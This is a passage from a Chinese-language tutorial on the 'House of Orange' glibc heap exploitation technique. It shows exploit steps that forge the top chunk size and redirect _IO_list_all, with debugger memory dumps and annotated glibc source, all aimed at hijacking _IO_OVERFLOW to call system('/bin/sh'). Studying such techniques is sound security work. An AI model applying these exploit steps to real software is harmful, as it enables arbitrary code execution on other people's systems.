此时，我们假设有溢出漏洞：
    72     top = (size_t *) ( (char *) p1 + 0x400 - 16);
      73     top[1] = 0xc01;
将top chunk 的size 改为 0xc01 ，这样就能满足上面总结的条件。
之后，我们申请的 0x1000 size 的 chunk
    p2 = malloc(0x1000);
0x1000 > 0xc01 , 又由于 top chunk 的伪造满足条件，紧接着原有的 top chunk 会被放到 unsorted bins里
    PwnLife> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x7ffff7dd1b58 (main_arena+88) —▸ 0x602400 ◂— 0x7ffff7dd1b58
    smallbins
    empty
    largebins
    empty
我们看下此时 heap 的情况
    PwnLife> x/4gx p1-0x10+0x400
    0x602400:   0x0000000000000000  0x0000000000000be1      x/4gx p1-0x10+0x400+0xbe0
    0x602fe0:   0x0000000000000be0  0x0000000000000010      x/4gx p2-0x10
    0x623000:   0x0000000000000000  0x0000000000001011      x/4gx p2-0x10+0x1010
    0x624010:   0x0000000000000000  0x0000000000020ff1      unsortedbin
    unsortedbin
    all: 0x7ffff7dd1b58 (main_arena+88) —▸ 0x602400 ◂— 0x7ffff7dd1b58
    PwnLife>
另外可以看到 old top chunk 被缩小了 0x20，缩小的空间被用于放置 fencepost chunk。
根据放入 unsorted bin 中 old top chunk 的 fd/bk 指针，可以推算出 _IO_list_all 的地址。然后通过溢出将
old top 的 bk 改写为 _IO_list_all-0x10，这样在进行 unsorted bin attack 时，就会将
_IO_list_all 修改为 &unsorted_bin-0x10：
    top[3] = io_list_all - 0x10;
    0x602400 PREV_INUSE {
      prev_size = 0,
      size = 3041,
      fd = 0x7ffff7dd1b58 ,
      bk = 0x7ffff7dd24f0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    PwnLife> x/20gx 0x7ffff7dd24f0
    0x7ffff7dd24f0: 0x0000000000000000  0x0000000000000000
    0x7ffff7dd2500 :  0x00007ffff7dd2520  0x0000000000000000
    0x7ffff7dd2510: 0x0000000000000000  0x0000000000000000
    0x7ffff7dd2520 :   0x00000000fbad2887  0x00007ffff7dd25a3
    0x7ffff7dd2530 :    0x00007ffff7dd25a3  0x00007ffff7dd25a3
    0x7ffff7dd2540 :    0x00007ffff7dd25a3  0x00007ffff7dd25a3
    0x7ffff7dd2550 :    0x00007ffff7dd25a3  0x00007ffff7dd25a3
    0x7ffff7dd2560 :    0x00007ffff7dd25a4  0x0000000000000000
    0x7ffff7dd2570 :    0x0000000000000000  0x0000000000000000
    0x7ffff7dd2580 :    0x0000000000000000  0x00007ffff7dd2600
这里，会顺便涉及到 glibc 的异常处理.
一般在出现内存错误时，会调用函数 malloc_printerr() 打印出错信息
    static void
    malloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr)
    {
      [...]
      if ((action & 5) == 5)
        __libc_message (action & 2, "%s\n", str);
      else if (action & 1)
        {
          char buf[2 * sizeof (uintptr_t) + 1];
          buf[sizeof (buf) - 1] = '\0';
          char *cp = _itoa_word ((uintptr_t) ptr, &buf[sizeof (buf) - 1], 16, 0);
          while (cp > buf)
            *--cp = '0';
          __libc_message (action & 2, "*** Error in `%s': %s: 0x%s ***\n",
                          __libc_argv[0] ? : "", str, cp);
        }
      else if (action & 2)
        abort ();
    }
当调用 __libc_message：
    // sysdeps/posix/libc_fatal.c
    /* Abort with an error message.  */
    void
    __libc_message (int do_abort, const char *fmt, ...)
    {
      [...]
      if (do_abort)
        {
          BEFORE_ABORT (do_abort, written, fd);
          /* Kill the application.  */
          abort ();
        }
    }
do_abort 调用 fflush，即 _IO_flush_all_lockp：
    // stdlib/abort.c
    #define fflush(s) _IO_flush_all_lockp (0)
      if (stage == 1)
        {
          ++stage;
          fflush (NULL);
        }
    // libio/genops.c
    int
    _IO_flush_all_lockp (int do_lock)
    {
      int result = 0;
      struct _IO_FILE *fp;
      int last_stamp;
    #ifdef _IO_MTSAFE_IO
      __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
      if (do_lock)
        _IO_lock_lock (list_all_lock);
    #endif
      last_stamp = _IO_list_all_stamp;
      fp = (_IO_FILE *) _IO_list_all;   // 将其覆盖
      while (fp != NULL)
        {
          run_fp = fp;
          if (do_lock)
        _IO_flockfile (fp);
          if (((fp->_mode _IO_write_ptr > fp->_IO_write_base)
    #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
           || (_IO_vtable_offset (fp) == 0
               && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                        > fp->_wide_data->_IO_write_base))
    #endif
           )
          && _IO_OVERFLOW (fp, EOF) == EOF)     // 将其修改为 system 函数
        result = EOF;
          if (do_lock)
        _IO_funlockfile (fp);
          run_fp = NULL;
          if (last_stamp != _IO_list_all_stamp)
        {
          /* Something was added to the list.  Start all over again.  */
          fp = (_IO_FILE *) _IO_list_all;
          last_stamp = _IO_list_all_stamp;
        }
          else
        fp = fp->_chain;    // 指向我们指定的区域
        }
    #ifdef _IO_MTSAFE_IO
      if (do_lock)
        _IO_lock_unlock (list_all_lock);
      __libc_cleanup_region_end (0);
    #endif
      return result;
    }
_IO_list_all 是一个 _IO_FILE_plus 类型的对象，我们的目的就是将 _IO_list_all 指针改写为一个伪造的指针，它的
_IO_OVERFLOW 指向 system，并且前 8 字节被设置为 '/bin/sh'，所以对 _IO_OVERFLOW(fp, EOF)
的调用最终会变成对 system('/bin/sh') 的调用。
    // libio/libioP.h
    /* We always allocate an extra word following an _IO_FILE.
       This contains a pointer to the function jump table used.
       This is for compatibility with C++ streambuf; the word can
       be used to smash to a pointer to a virtual function table. */
    struct _IO_FILE_plus
    {
      _IO_FILE file;
      const struct _IO_jump_t *vtable;
    };
    // libio/libio.h
    struct _IO_FILE {
      int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */
    #define _IO_file_flags _flags
      /* The following pointers correspond to the C++ streambuf protocol. */
      /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
      char* _IO_read_ptr;    /* Current read pointer */
      char* _IO_read_end;    /* End of get area. */
      char* _IO_read_base;    /* Start of putback+get area. */
      char* _IO_write_base;    /* Start of put area. */